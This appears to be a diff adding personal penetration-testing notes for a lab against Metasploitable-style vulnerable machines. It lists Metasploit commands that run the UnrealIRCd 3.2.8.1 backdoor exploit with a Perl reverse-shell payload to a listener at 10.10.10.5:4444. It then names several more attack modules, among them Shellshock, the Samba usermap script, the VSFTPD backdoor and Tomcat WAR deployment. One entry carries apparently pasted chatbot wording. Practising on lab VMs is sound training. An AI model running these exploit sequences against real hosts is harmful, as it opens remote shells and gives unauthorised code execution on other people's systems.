@@ -1,0 +1,42 @@
+
+Working Exploits
+
+UnReal IRCd Exploit Instructions
+UnrealIRCd 3.2.8.1 Backdoor Command Execution
+
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+set RHOSTS 10.10.10.105
+set RPORT 6667
+set payload cmd/unix/reverse_perl
+set LHOST 10.10.10.5
+set LPORT 4444
+
+
+
+
+Potential Exploits 
+
+1. DVWA - SQL Injection
+Metasploit Module: auxiliary/sqli/dvwa/dvwa_sqli
+Description: This module exploits the SQL injection vulnerability in the Damn Vulnerable Web App (DVWA).
+2. Tomcat Manager Application Deployer Authentication Bypass
+Metasploit Module: exploit/multi/http/tomcat_mgr_deploy
+Description: Exploits weak/default credentials in Tomcat's manager application to deploy a malicious WAR file.
+3. PHP CGI Argument Injection (CVE-2012-1823)
+Metasploit Module: exploit/multi/http/php_cgi_arg_injection
+Description: This exploits a vulnerability in the way PHP-CGI handles query string parameters, allowing for code execution.
+4. Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
+Metasploit Module: exploit/multi/http/apache_mod_cgi_bash_env_exec
+Description: This module exploits the Shellshock vulnerability, a flaw in how the Bash shell handles environment variables.
+5. Samba "username map script" Command Execution
+Metasploit Module: exploit/multi/samba/usermap_script
+Description: This module exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3 when using the "username map script" directive.
+6. VSFTPD v2.3.4 Backdoor Command Execution
+Metasploit Module: exploit/unix/ftp/vsftpd_234_backdoor
+Description: This module exploits a malicious backdoor that was added to the VSFTPD download archive.
+7. TWiki Search Function 'cmd' Parameter Command Injection
+Metasploit Module: exploit/unix/webapp/twiki_search
+Description: This module exploits a vulnerability in the search function of TWiki that allows for command injection.
+8. Wordpress Plugin "Duplicate Page" Unauthenticated SQL Injection
+Note: As of my last update, this specific exploit may not be present in Metasploitable, but similar WordPress vulnerabilities are often included in vulnerable VMs for educational purposes.
+Suggestion: Look for vulnerabilities in known WordPress installations on Metasploitable or similar educational VMs.
